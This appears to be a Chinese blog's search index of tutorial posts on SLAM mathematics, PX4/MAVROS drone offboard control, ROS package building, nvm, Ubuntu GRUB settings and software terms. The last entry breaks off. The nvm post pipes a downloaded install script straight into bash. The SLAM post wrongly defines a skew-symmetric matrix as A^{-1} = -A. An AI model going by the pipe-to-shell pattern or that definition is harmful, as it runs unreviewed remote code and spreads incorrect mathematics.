<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SLAM中位姿估计的数学基础]]></title>
    <url>%2F2019%2F05%2F20%2FSLAM%E4%B8%AD%E4%BD%8D%E5%A7%BF%E4%BC%B0%E8%AE%A1%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[同步定位与地图构建（SLAM或Simultaneous localization and mapping）是一种概念：希望机器人从未知环境的未知地点出发，在运动过程中通过重复观测到的地图特征（比如，墙角，柱子等）定位自身位置和姿态，再根据自身位置增量式的构建地图，从而达到同时定位和地图构建的目的。 SLAM的核心工作有两个： 地图构建 研究如何把从一系列传感器收集到的信息，集成到一个一致性的模型上的问题。它可以被描述为第一核心问题：这个世界长什么样？地图构建的核心部分是环境的表达方式以及传感器数据的解释。 定位 研究在地图上估测机器人的坐标和姿势形态的问题；换而言之，机器人需要回答这里的第二核心问题，我在哪？典型的解包含以下两个方面：追踪——通常机器人的初始位置已知；全局定位——通常只给出很少，甚至不给出有关于起始位置环境特征的先验信息。 下面主要介绍SLAM定位研究中涉及的数学知识。 向量点积有如下两个向量: a=\begin{pmatrix} a_{1}\\ a_{2}\\ a_{3} \end{pmatrix},b=\begin{pmatrix} b_{1}\\ b_{2}\\ b_{3} \end{pmatrix}它们的点乘定义如下： % 即两个向量点乘等于一个向量的转置乘以另一个向量。 向量叉积两个向量做叉积结果还是一个向量，这个向量垂直于这两个做叉积的向量所组成的平面。 a\times b=\begin{vmatrix} i & j & k\\ a_{1} & a_{2} & a_{3}\\ b_{1} & b_{2} & b_{3} \end{vmatrix}=(a_{2}b_{3}-a_{3}b_{2})i+(a_{3}b_{1}-a_{1}b_{3})j+(a_{1}b_{2}-a_{2}b_{1})k为了计算方便，将两个向量写成行列式的形式，然后按对角线法则计算行列式的值。i、j、k分量分别即代表x、y、z轴方向的分量。写成列向量的形式如下: \begin{pmatrix} a_{2}b_{3}-a_{3}b_{2}\\ a_{3}b_{1}-a_{1}b_{3}\\ a_{1}b_{2}-a_{2}b_{1} \end{pmatrix}=\begin{pmatrix} 0\cdot b_{1}-a_{3}b_{2}+a_{2}b_{3}\\ a_{3}b_{1}-0\cdot b_{2}-a_{1}b_{3}\\ -a{2}b_{1}+a_{1}b_{2}+0\cdot b_{3} \end{pmatrix}=\begin{pmatrix} 0 & -a_{3} & a_{2}\\ a_{3} & 0 & -a_{1}\\ -a_{2} & a_{1} & 0 \end{pmatrix}\begin{pmatrix} b_{1}\\ b_{2}\\ b_{3} \end{pmatrix}再将其写成与b相乘的矩阵形式，提取系数矩阵。这个系数矩阵就称作向量a的反对称矩阵，用a^记。所谓反对称矩阵，是指满足下面这个条件的矩阵。 A^{-1}=-A因为向量叉积的结果是一个向量，因此可以用来表示旋转，结果向量的方向为旋转轴，大小为旋转角。结果可以看作一个旋转向量。 对极几何两个相机在不同位置拍摄同一物体，两张照片中的景物有重叠部分，那么理论上这两张照片会存在一定的对应关系，而对极几何就是探索描述它们之间对应关系的工具。相机在不同位置拍摄同一物体示意图如图1所示。 图1 相机在不同位置拍摄同一物体示意图 图中的概念有： 极点e：分别是左边相机中心在右图像平面上的像，右相机中心在左像平面上的像。 极平面：两个相机中心和空间中某店p形成的平面。 极线l：极平面分别和两个像平面的交线。 对极几何则是描述这几个量之间的对应关系。直观讲，从左图的角度看，如果不知道p点的深度信息，射线op是这个点可能出现的空间位置，因为该射线上的点都会投影到同一个像素点，同时，如果不知道p点的具体位置，那么当在右图的位置看时，极线 l’ 就是点p可能出现的位置，即在这条线上的某个地方。如图2所示: 图2 物体位置示意图 在计算机视觉中，基础矩阵（Fundamental matrix） $F$ 是一个3×3的矩阵，表达了立体像对的像点之间的对应关系。在对极几何中，对于立体像对中的一对同名点，它们的齐次化图像坐标分别为 $p$ 与 $p’$， ${\displaystyle \mathrm {F} p}$ 表示一条必定经过 $p’$的直线（极线）。这意味着立体像对的所有同名点对都满足： {\displaystyle p'^{\top }\mathrm {F} p=0.}F矩阵中蕴含了立体像对的两幅图像在拍摄时相互之间的空间几何关系（外参数）以及相机检校参数（内参数），包括旋转、位移、像主点坐标和焦距。因为 F 矩阵的秩为2，并且可以自由缩放（尺度化），所以只需7对同名点即可估算出F的值。 基础矩阵这一概念由Q. T. Luong在他那篇很有影响力的博士毕业论文[1]中提出。Faugeras则是在1992年发表的著作中以上面的关系式给出了 F 矩阵的定义。尽管Longuet-Higgins提出的本质矩阵也满足类似的关系式，但本质矩阵中并不蕴含相机检校参数。本质矩阵与基础矩阵之间的关系可由下式表达： {\displaystyle \mathrm {E} =\mathrm {K'^{\top }} \mathrm {FK} .}其中 $\mathrm{K}$和 ${\displaystyle \mathrm {K’} }$分别为两个相机的内参数矩阵。 参考链接 SLAM数学基础,by zhaoxuhui. 即时定位与地图构建,by wikipedia. 大牛讲堂｜SLAM第一篇：基础知识, by 地平线HorizonRobotics. 学习SLAM需要哪些预备知识？,by wikipedia. 计算机视觉中的数学方法,by 吴福朝. 对极几何及单应矩阵, by Rap_God.​]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4无人机MAVROS外部控制教程]]></title>
    <url>%2F2019%2F05%2F15%2FPX4%E6%97%A0%E4%BA%BA%E6%9C%BAMAVROS%E5%A4%96%E9%83%A8%E6%8E%A7%E5%88%B6%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[PX4中的offboard模式能够接受来自外部的控制指令，搭配机载或支持MAVROS的协同计算机，可在PX4飞控平台上加入视觉处理或人工智能，以实现无人机自动控制功能。下面即介绍如何在基于MAVROS的协同计算机上运行程序控制PX4无人机。具体过程如下： PX4固件参数设置在开始无人机外部控制开发之前，您需要在PX4固件中设置两件事: 将RC开关映射到场外模式激活 要执行此操作，请在QGroundControl中加载参数并查找RC_MAP_OFFB_SW参数，您可以为其分配要用于激活offboard模式的RC通道。 以这样一种方式映射事物是非常有用的。当你脱离offboard模式时，你会进入位置控制。 虽然此步骤不是强制性的，因为您可以使用MAVLink消息激活offboard模式。 我们认为这种方法更安全。 启用配套计算机接口 查找SYS_COMPANION参数并将其设置为921600（推荐）或57600. 此参数将激活Telem2端口上的MAVLink流，其中包含特定于板载模式的数据流以及相应的波特率（921600 8N1或57600 8N1）。 本人实验测试时SYS_COMPANION参数设置成Companion Link(57600) 。此外要注意通过Telem2端口的无线收发装置与地面支持MAVROS的具有无线收发装置的协同计算机连接。并长按安全锁手动解锁无人机。 安装MAVROS在地面协同计算机上安装MAVROS请参考Ubuntu16.04安装MAVROS，完成后使用如下命令启动MAVROS: 123$ roscore# 启动MAVROS,链接到本地ROS$ roslaunch mavros px4.launch fcu_url:=serial:///dev/ttyUSB0:57600 构建Offboard示例程序ROS节点Offboard示例程序的构建请参考ROS构建Package和Node的教程，完成后使用如下命令启动Offboard示例程序： 123$ cd catkin_ws/$ source devel/setup.bash$ rosrun offboard offboard_node 参考链接 PX4软件在环仿真之MAVROS外部控制,by jackhuang. Offboard Control, by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4软件在环仿真之MAVROS外部控制]]></title>
    <url>%2F2019%2F05%2F15%2FPX4%E8%BD%AF%E4%BB%B6%E5%9C%A8%E7%8E%AF%E4%BB%BF%E7%9C%9F%E4%B9%8BMAVROS%E5%A4%96%E9%83%A8%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[PX4软件在环仿真之MAVROS外部控制将使用基于MAVROS的PX4外部控制ROS节点，控制在Gazebo仿真环境中的四悬翼无人机,如图1所示。 图1 px4软件在环仿真 具体步骤如下： 构建PX4自驾仪请参考PX4编译开发环境配置和Development Environment on Linux配置PX4编译开发环境。需要指出的是，为使用Gazebo仿真环境，PX4开发工具链使用脚本ubuntu_sim_ros_gazebo.sh构建。 PX4编译开发环境配置完成后，使用如下命令启动：12$ cd ~/src/Firmware$ make posix_sitl_default gazebo 安装MAVROS安装MAVROS请参考Ubuntu16.04安装MAVROS，完成后使用如下命令启动MAVROS: 123$ roscore# 启动MAVROS,链接到本地ROS$ roslaunch mavros px4.launch fcu_url:=&quot;udp://:14540@127.0.0.1:14557&quot; 构建Offboard示例程序ROS节点Offboard示例程序的构建请参考ROS构建Package和Node的教程，完成后使用如下命令启动Offboard示例程序： 123$ cd catkin_ws/$ source devel/setup.bash$ rosrun offboard offboard_node 最终能够在Gazebo仿真环境中观察到四悬翼无人机垂直起飞到2米的高度。 参考链接 Ubuntu16.04安装MAVROS,by jackhuang. ROS构建Package和Node的教程,by jackhuang. PX4编译开发环境配置,by jackhuang. Development Environment on Linux, by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>Gazebo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROS构建Package和Node的教程]]></title>
    <url>%2F2019%2F05%2F15%2FROS%E6%9E%84%E5%BB%BAPackage%E5%92%8CNode%E7%9A%84%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。 ROS的运行架构是一种使用ROS通信模块实现模块间P2P的松耦合的网络连接的处理架构，它执行若干种类型的通讯，包括： 基于服务的同步RPC（远程过程调用）通讯； 基于Topic的异步数据流通讯，还有参数服务器上的数据存储。 ROS可与PX4一起用于飞行器的外部控制, 它使用MAVROS节点与在硬件上运行的PX4或使用Gazebo Simulator进行通信。MAVROS节点的安装请参考Ubuntu16.04安装MAVROS，下面以编写基于MAVROS的外部控制节点为例，介绍ROS包和节点的构建过程。 ROS包构建方法catkin和rosbuild是构建ROS包的两种方法。目前多用catkin构建ros包。 catkin包可以构建为独立项目，与构建普通cmake项目的方式相同，但catkin还提供了工作空间的概念，您可以在其中同时构建多个相互依赖的包。 ROS包构成ROS包是其代码组织的一种高级结构好哦，最简单的catkin包的构成如下： 123my_package/ CMakeLists.txt package.xml 其中: 包必须包含一个符合catkin的package.xml文件。 该package.xml文件提供有关包的元信息。 包必须包含一个使用catkin的CMakeLists.txt。 如果它是catkin元数据包，它必须具有相关的样板CMakeLists.txt文件。 包都必须有自己的文件夹。 这意味着没有嵌套包，也没有多个包共享同一目录。 catkin工作空间的构成使用catkin软件包的推荐方法是使用catkin工作区，但您也可以独立构建catkin软件包。 一个简单的工作空间可能如下所示： 12345678910workspace_folder/ -- WORKSPACE src/ -- SOURCE SPACE CMakeLists.txt -- &apos;Toplevel&apos; CMake file, provided by catkin package_1/ CMakeLists.txt -- CMakeLists.txt file for package_1 package.xml -- Package manifest for package_1 ... package_n/ CMakeLists.txt -- CMakeLists.txt file for package_n package.xml -- Package manifest for package_n 创建catkin包通常使用catkin_create_pkg命令创建新的catkin包，具体步骤如下： 12345678$ mkdir -p ~/catkin_ws/src$ cd ~/catkin_ws/src# 创建名为offboard的ros包，它依赖roscpp、mavros和geometry_msgs$ catkin_create_pkg offboard roscpp mavros geometry_msgs$ cd offboard/src/# 创建offboard_node.cpp，将官方PX4外部控制例程代码写入该文件# 该文件也是offboard包的第一个node$ touch offboard_node.cpp offboard_node.cpp文件的具体内容如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687/** * @file offb_node.cpp * @brief Offboard control example node, written with MAVROS version 0.19.x, PX4 Pro Flight * Stack and tested in Gazebo SITL */#include &lt;ros/ros.h&gt;#include &lt;geometry_msgs/PoseStamped.h&gt;#include &lt;mavros_msgs/CommandBool.h&gt;#include &lt;mavros_msgs/SetMode.h&gt;#include &lt;mavros_msgs/State.h&gt;mavros_msgs::State current_state;void state_cb(const mavros_msgs::State::ConstPtr&amp; msg)&#123; current_state = *msg;&#125;int main(int argc, char **argv)&#123; ros::init(argc, argv, &quot;offb_node&quot;); ros::NodeHandle nh; ros::Subscriber state_sub = nh.subscribe&lt;mavros_msgs::State&gt; (&quot;mavros/state&quot;, 10, state_cb); ros::Publisher local_pos_pub = nh.advertise&lt;geometry_msgs::PoseStamped&gt; (&quot;mavros/setpoint_position/local&quot;, 10); ros::ServiceClient arming_client = nh.serviceClient&lt;mavros_msgs::CommandBool&gt; (&quot;mavros/cmd/arming&quot;); ros::ServiceClient set_mode_client = nh.serviceClient&lt;mavros_msgs::SetMode&gt; (&quot;mavros/set_mode&quot;); //the setpoint publishing rate MUST be faster than 2Hz ros::Rate rate(20.0); // wait for FCU connection while(ros::ok() &amp;&amp; !current_state.connected)&#123; ros::spinOnce(); rate.sleep(); &#125; geometry_msgs::PoseStamped pose; pose.pose.position.x = 0; pose.pose.position.y = 0; pose.pose.position.z = 2; //send a few setpoints before starting for(int i = 100; ros::ok() &amp;&amp; i &gt; 0; --i)&#123; local_pos_pub.publish(pose); ros::spinOnce(); rate.sleep(); &#125; mavros_msgs::SetMode offb_set_mode; offb_set_mode.request.custom_mode = &quot;OFFBOARD&quot;; mavros_msgs::CommandBool arm_cmd; arm_cmd.request.value = true; ros::Time last_request = ros::Time::now(); while(ros::ok())&#123; if( current_state.mode != &quot;OFFBOARD&quot; &amp;&amp; (ros::Time::now() - last_request &gt; ros::Duration(5.0)))&#123; if( set_mode_client.call(offb_set_mode) &amp;&amp; offb_set_mode.response.mode_sent)&#123; ROS_INFO(&quot;Offboard enabled&quot;); &#125; last_request = ros::Time::now(); &#125; else &#123; if( !current_state.armed &amp;&amp; (ros::Time::now() - last_request &gt; ros::Duration(5.0)))&#123; if( arming_client.call(arm_cmd) &amp;&amp; arm_cmd.response.success)&#123; ROS_INFO(&quot;Vehicle armed&quot;); &#125; last_request = ros::Time::now(); &#125; &#125; local_pos_pub.publish(pose); ros::spinOnce(); rate.sleep(); &#125; return 0;&#125; 之后需要修改~/catkin_ws/src/offboard目录下的CMakeLists.txt文件。取消掉一些注释，生成相应节点（否则会出现找不到节点的错误）。 构建catkin包在catkin工作空间（catkin_ws）中，使用catkin_make工具从源文件构建和安装一个包： 1234567$ cd ~/catkin_ws$ catkin_make$ catkin_make install# 配置catkin工作空间，使ros能找到刚生成的offboard包$ source devel/setup.bash# 查看ros包路径环境变量是否配置好$ echo $ROS_PACKAGE_PATH 参考链接 Ubuntu16.04安装MAVROS,by jackhuang. Creating a ROS Package, by ros homepage. Building a ROS Package, by ros homepage. Understanding ROS Nodes, by ros homepage. catkin 与 rosbuild解析及两者区别和联系,by Xuefeng_BUPT. Pixhawk原生固件PX4之SITL软件在环仿真,by FantasyJXF. Pixhawk原生固件PX4之offboard,by FantasyJXF. MAVROS Offboard control example, by dronecode.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>PX4</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用nvm进行nodejs版本管理]]></title>
    <url>%2F2019%2F05%2F11%2F%E4%BD%BF%E7%94%A8nvm%E8%BF%9B%E8%A1%8Cnodejs%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[nvm是一个简单bash脚本，用于管理多个活动的nodejs版本。在linux操作系统中使用nvm安装和管理nodejs十分方便。下面简单介绍ubuntu 16.04操作系统下nvm的安装使用。 安装脚本在Ubuntu 16.04的终端中，直接运行如下命令： 1wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash 管理Nodejs 安装最新nodejs长期支持版 1nvm install --lts 卸载最新nodejs长期支持版 1nvm uninstall --lts 参考链接 Node Version Manager, by nvm-sh.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dell笔记本安装Ubuntu16.04出现的问题及解决方案]]></title>
    <url>%2F2019%2F05%2F11%2FDell%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85Ubuntu16-04%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[PX4开发推荐在Ubuntu16.04上进行，然在一些带独立显卡的笔记本上安装时，进入安装界面就卡住了。问题产生原因显然与显卡驱动有关。 解决方案解决方案可参考链接Ubuntu16.04—64位安装及使用中出现的问题。主要有两种方法： 重新开机，光标选中“Install Ubuntu” ，按“e”，进入grub界面，将倒数第二行中的“quiet splash —-”改为“nomodeset”。F10保存，就可以进入安装界面，进行安装。 如果加入nomodeset参数不行，则试试加入nouveau.modeset=0，步骤一样。 后续维护如果能顺利安装，则安装好后，添加选项到/etc/default/grub文件。步骤如下：1sudo gedit /etc/default/grub 然后将nomodeset选项添加到 GRUB_CMDLINE_LINUX_DEFAULT: 1234567GRUB_DEFAULT=0GRUB_HIDDEN_TIMEOUT=0GRUB_HIDDEN_TIMEOUT_QUIET=trueGRUB_TIMEOUT=5GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash nomodeset&quot;GRUB_CMDLINE_LINUX=&quot;&quot; 最后更显grub启动文件：1sudo update-grub 参数含义附内核显示参数的含义：123456789101112131415nomodeset 不载入所有关于显示卡的驱动nouveau.modeset=0 关闭nvidia显卡的驱动，反之=1为开启i915.modeset=0 关闭Intel显卡的驱动，挺好奇对于Intel内显会有什么影响xforcevesa或radeon.modeset=0 xforcevesa 跟AMD显卡(ATI)有关的设定，我猜也是关闭acpi=off 回归旧时代，电源相关设定，OS无法控管，交给bios处理acpi功能失效，有不少硬体上奇怪的问题，可以用这参数解决 参考链接 Ubuntu16.04—64位安装及使用中出现的问题,by 一部电影. acpi_osi=linux、 nomodeset是什么意思? 功能?, by 峰Caesar. How do I set ‘nomodeset’ after I’ve already installed Ubuntu?,by askubuntu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04安装MAVROS]]></title>
    <url>%2F2019%2F05%2F10%2FUbuntu16-04%E5%AE%89%E8%A3%85MAVROS%2F</url>
    <content type="text"><![CDATA[MAVROS包支持运行ROS的计算机、支持Mavlink的自驾仪、支持Mavlink的地面控制站之间使用Mavlink协议进行通信，如图1所示。 图1 px4软件在环仿真 为构建px4软件在环仿真环境，下面介绍在协同计算机上安装Ubuntu16.04、ROS和MAVROS的步骤。 安装ubuntu 16.04安装ubuntu 16.04 LTS桌面板的教程请参考链接Ubuntu 16.04 安装基础入门教程（图文）。 安装ROSROS简介ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。 ROS的首要设计目标是在机器人研发领域提高代码复用率。ROS是一种分布式处理框架（又名Nodes）。这使可执行文件能被单独设计，并且在运行时松散耦合。这些过程可以封装到数据包（Packages）和堆栈（Stacks）中，以便于共享和分发。ROS还支持代码库的联合系统。使得协作亦能被分发。这种从文件系统级别到社区一级的设计让独立地决定发展和实施工作成为可能。上述所有功能都能由ROS的基础工具实现。 ROS有三个层次的概念：分别为Filesystem level，Computation graph level， 以及Communication level。 以下内容具体的总结了这些层次及概念。除了这三个层次的概念， ROS也定义了两种名称— Package资源名称和Graph资源名称。 安装ROS不建议在虚拟机中安装Ubuntu，再安装ROS。具体ROS安装步骤请参考ROS 不能再详细的安装教程和Ubuntu install of ROS Kinetic。在此只简单记录Ubuntu 16.04 中安装ROS步骤： 设置source.list 1sudo sh -c &apos;echo &quot;deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main&quot; &gt; /etc/apt/sources.list.d/ros-latest.list&apos; 设置公钥 如何在连接服务器的过程中出现问题，可设置可选的hkp://pgp.mit.edu:80 或 hkp://keyserver.ubuntu.com:80 1sudo apt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-key 421C365BD9FF1F717815A3895523BAEEB01FA116 安装 12sudo apt-get updatesudo apt-get install ros-kinetic-desktop-full 初始化rosdep 12sudo rosdep initrosdep update 环境配置 12echo &quot;source /opt/ros/kinetic/setup.bash&quot; &gt;&gt; ~/.bashrcsource ~/.bashrc 安装ros组件构建环境 1sudo apt install python-catkin-tools python-rosinstall python-rosinstall-generator python-wstool build-essential -y 运行ROS在Ubuntu 16.04终端中运行如下命令：1234567891011121314151617181920212223242526272829303132333435363738# roscore will start up a ROS Master, a ROS Parameter Server and a rosout logging node$ roscore# rosnode is a command-line tool for printing information about ROS Nodes.$ rosnode list# rospack allows you to get information about packages. $ rospack list# rosrun will locate PACKAGE and try to find an executable named EXECUTABLE in the PACKAGE tree. If it finds it, it will run it with ARGS.# Usage: rosrun [--prefix cmd] [--debug] PACKAGE EXECUTABLE [ARGS]$ rosrun turtlesim turtlesim_node$ rosrun turtlesim turtle_teleop_key# check what&apos;s happen in ros system$ rosrun rqt_graph rqt_graph# rqt_plot displays a scrolling time plot of the data published on topics$ rosrun rqt_plot rqt_plot# rostopic is a command-line tool for printing information about ROS Topics.$ rostopic list# rostopic echo shows the data published on a topic.$ rostopic echo /turtle1/cmd_vel# rostopic type returns the message type of any topic being published.$ rostopic type /turtle1/cmd_vel# rostopic pub publishes data on to a topic currently advertised.$ rostopic pub -1 /turtle1/cmd_vel geometry_msgs/Twist -- &apos;[2.0, 0.0, 0.0]&apos; &apos;[0.0, 0.0, 1.8]&apos;# rostopic hz reports the rate at which data is published.$ rostopic hz /turtle1/pose# check info of /turtlesim node$ rosnode info /turtlesim 安装MAVROS具体安装MAVROS的步骤请参考链接MAVROS。下面简单介绍Ubuntu 16.04下从源代码安装MAVROS的过程。 创建catkin工作空间 1234mkdir -p ~/catkin_ws/srccd ~/catkin_wscatkin initwstool init src 安装MAVLink 1rosinstall_generator --rosdistro kinetic mavlink | tee /tmp/mavros.rosinstall 安装MAVROS 1rosinstall_generator --upstream mavros | tee -a /tmp/mavros.rosinstall 创建工作空间和依赖 123wstool merge -t src /tmp/mavros.rosinstallwstool update -t src -j4rosdep install --from-paths src --ignore-src -y 安装GeographicLib数据集 1sudo ./src/mavros/mavros/scripts/install_geographiclib_datasets.sh 构建源 1catkin build 添加工作空间到ros环境 12#Needed or rosrun can&apos;t find nodes from this workspace.source devel/setup.bash 参考链接 Ubuntu 16.04 安装基础入门教程（图文）, by ubuntu中文论坛. 机器人操作系统,by wikipedia. ROS 不能再详细的安装教程,by 小萌是个球. Ubuntu install of ROS Kinetic, by ROS.org. ROS Tutorials, by ROS.org. MAVROS, by DroneCode. catkin 与 rosbuild解析及两者区别和联系,by Xuefeng_BUPT. Installing and Configuring Your ROS Environment, by ros.org. Installing and Configuring Your ROS Environment,by ros.org.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
        <tag>PX4</tag>
        <tag>ROS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机科学术语辨析]]></title>
    <url>%2F2019%2F05%2F05%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E6%9C%AF%E8%AF%AD%E8%BE%A8%E6%9E%90%2F</url>
    <content type="text"><![CDATA[计算机科学中的一些术语是同行之间进行交流的工具，但是这些术语约定俗成，缺乏权威定义，在不同的语境下有不同的涵义，不同的人有不同的理解，由此造成很多分歧。本文记录常用计算机科学术语，通过规范和校正其内涵和外延，避免分歧，提高效率。 常用术语架构软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计。 软件架构是一个系统的草图，抽象层次高。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。 模式在软件工程中，设计模式（design pattern）是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。这个术语是由埃里希·伽玛（Erich Gamma）等人在1990年代从建筑设计领域引入到计算机科学的。 设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案。面向对象设计模式通常以类别或对象来描述其中的关系和相互作用，但不涉及用来完成应用程序的特定类别或对象。设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力。 《设计模式》一书原先把设计模式分为创建型模式、结构型模式、行为型模式，把它们通过授权、聚合、诊断的概念来描述。 模块模块，module，模块是一个通用概念，可能从功能或其他目的来区分。模块可以是子系统子领域，主要取决于上下文环境的用法。 通常我们会说程序模块，功能模块，这实际上是在按照不同的标准对模块的内容和范围的不同定义。 通常我们说的程序模块，是指的一段能够实现某个有价值目标的的成员代码段，这样的东西，我们还有另一个称呼：例程，而例程有两种，即函数和过程，它们都能实现一个有价值的目标供其它的模块使用。 而功能模块的说法一般在分析和设计阶段出现得比较频繁，通常我们用一个功能模块来说明一个功能所包含的系统行为，当我们觉得分析的颗粒度可能更大一些的时候我们可以用一个功能模块来表示一组功能的集合，这似乎让我们觉得，模块这个词的概念和“子系统”这个词的概念有些模糊，是的，事实上，有些大的模块会慢慢的让我们觉得称呼他们子系统更合适，或者一个子系统，我们会慢慢发现你还包含着一些模块。 但是无论怎样，定义模块的原则应该是：高内聚和低耦合。 组件软件组件，定义为自包含的、可编程的、可重用的、与语言无关的软件单元。 插件根据对组件和模块的分析，插件属于组件，而且还是一个程序模块，也是一个功能模块。插件是一种电脑程序，通过和应用程序的互动，来替应用程式增加一些特定的功能。 插件必须依赖于应用程序才能发挥自身功能，仅靠插件是无法正常运行的。 使用方法：满足一定接口规范的具有一定功能的程序模块。开发者可以在自己软件系统中设计相应的接口以匹配某个插件，也可以设计一定的接口规范，来让别人开发插件。插件和程序之间通过接口进行交互。 控件可视化的组件。 中间件中间件是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 术语辨析面向对象编程 VS 面向过程编程 VS 面向切面编程面向过程(Procedure Oriented)是一种以过程为中心的编程思想。这些都是以什么正在发生为主要目标进行编程，不同于面向对象的是谁在受影响。与面向对象明显的不同就是封装、继承、类。 面向对象编程（Object Oriented Programming，OOP，面向对象程序设计）是一种计算机编程架构。OOP 的一条基本原则是计算机程序是由单个能够起到子程序作用的单元或对象组合而成。OOP 达到了软件工程的三个主要目标：重用性、灵活性和扩展性。为了实现整体运算，每个对象都能够接收信息、处理数据和向其它对象发送信息。 面向切面编程（Aspect Oriented Programming(AOP)），是一个比较热门的话题。AOP主要实现的目的是针对业务处理过程中的切面进行提取，它所面对的是处理过程中的某个步骤或阶段，以获得逻辑过程中各部分之间低耦合性的隔离效果。 面向过程编程围绕行为组织事物，面向对象编程围绕事物组织行为，有没有类、有没有继承并不是两种编程方法差异的关键； 面向切面编程是横跨流程的，实现某个特定位置的功能，面向功能进行抽象。具体流程只需做引用即可，而不至于不同流程中冗余很多类似代码。 组件化开发 VS 模块化开发组件化和模块化的中心思想都是分而治之。目的都是将一个庞大的系统拆分成多个组件或者说是模块。 模块化就是将一个程序按照其功能做拆分，分成相互独立的模块，以便于每个模块只包含与其功能相关的内容。模块我们相对熟悉,比如登录功能可以是一个模块,搜索功能可以是一个模块,汽车的发送机也可是一个模块. 组件化就是基于可重用的目的，将一个大的软件系统按照分离关注点的形式，拆分成多个独立的组件，主要目的就是减少耦合. 一个独立的组件可以是一个软件包、web服务、web资源或者是封装了一些函数的模块。比如汽车的发动机是一个模块,也是一个组件,再或者前端中的一个日历控件是一个模块,也一个组件.这样，独立出来的组件可以单独维护和升级而不会影响到其他的组件. 组件和模块是一对容易混淆的名词,也常常被用来相互替换,两者是否有差异往往取决于专业背景、所在领域、以及视角。从设计上来看,组件强调复用,模块强调职责(内聚、分离),或者说组件是达到可复用要求的模块 模块化强调的是拆分，无论是从业务角度还是从架构、技术角度，模块化首先意味着将代码、数据等内容按照其职责不同分离，使其变得更加容易维护、迭代，使开发人员可以分而治之。 组件化则着重于可重用性，不管是界面上反复使用的用户头像按钮，还是处理数据的流程中的某个部件，只要可以被反复使用，并且进行了高度封装，只能通过接口访问，就可以称其为“组件”。 参考链接 面向对象 vs 类与继承 vs 面向组件, by 龙腾道默默地. 软件架构,by wikipedia. 软件架构入门,by 阮一峰. 设计模式),by wikipedia. 软件架构、框架、模式、模块、组件、插件概念汇总,by 时间的朋友. 模块化与组件化,by 滴答. 面向过程编程，面向对象编程和面向切面编程理解, by 枫叶千言.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PX4应用开发简要教程]]></title>
    <url>%2F2019%2F04%2F29%2FPX4%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E7%AE%80%E8%A6%81%E6%95%99%E7%A8%8B%2F</url>
